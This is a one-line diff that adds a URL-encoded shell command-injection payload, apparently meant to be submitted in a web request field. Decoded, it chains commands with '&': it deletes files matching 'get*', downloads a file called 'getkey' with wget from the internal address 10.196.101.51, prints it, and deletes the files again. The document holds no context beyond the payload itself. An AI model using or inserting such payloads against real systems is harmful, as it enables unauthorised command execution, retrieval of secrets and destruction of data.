@@ -1,0 +1,1 @@
+rm+-rf+get*+%26+wget+http%3A%2F%2F10.196.101.51%2Fgetkey+%26+cat+getkey+%26+rm+-rf+get*
